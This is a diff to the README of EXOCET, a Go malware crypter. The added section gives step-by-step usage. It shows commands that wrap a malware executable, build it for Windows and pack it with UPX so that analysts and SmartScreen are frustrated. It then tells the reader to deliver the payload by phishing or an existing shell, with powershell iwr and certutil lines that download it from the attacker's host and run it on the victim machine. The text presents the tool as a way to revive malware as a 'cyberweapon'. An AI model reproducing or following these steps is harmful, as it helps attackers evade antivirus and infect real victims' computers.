@@ -6,6 +6,21 @@
 changtan@listerunlimited.com
 <br>
 
+<br>
+# Updated EXOCET Usage
+
+Make sure you pack your payloads to avoid any leaks of the crypter's key and further frustrate malware analysts. A commercial top-of-the-line packer like Themida is NOT required. It would raise further suspicion without something like a code-signing certificate. Without code-signing certificate, on Windows systems, SmartScreen is automatically triggered. This is the rule for all potentially unwanted programs or "PUPs". 
+
+```
+go run exocet.go malware.exe outputmalware.go
+env GOOS=windows GOARCH=amd64 build -ldflags "-s -w" outputmalware.go
+upx --best outputmalware.exe
+```
+
+Then drop the payload on your target. Using something like a phishing email, link, or if you already have shell access, deliver it using something like hosting your own server locally `python -m http.server 80' and then on the machine you are compromising, run as a powershell prompt `iwr -Uri "http://yourip/outputmalware.exe" -OutFile "NotMalware.exe"` or `certutil.exe -urlcache -split -f http://yourip/outputmalware.exe` and then `outputmalware.exe`
+
+
+<br>
 
 ![](https://upload.wikimedia.org/wikipedia/en/4/46/Exocet_impact.jpg)
 <br>
@@ -34,8 +49,6 @@ Basically...
 6. **A custom shellcode executor is in the works**, it takes ordinary C shellcode and after num-transform, it will run it by creating a new process after allocating the correct virtual address space and granting it RWX permissions on Windows
 
 That means 32-bit, and 64-bit architectures, and it works on Linux, Windows, Macs, Unix, Android, iPhone, etc. You take, anything, and I mean ANYTHING, like the 1988 Morris Worm that nearly brought down the internet (which exploited a flaw in the fingerd listener daemon on UNIX), and make it a viable cyberweapon again.
-
-EXOCET is designed to be used with the DSX Program, or the "Cyber Metal Gear" as I envisioned it. Being able to launch and proliferate dangerous malware without a traceable launch trail.
 
 EXOCET is written entirely in Go.
 
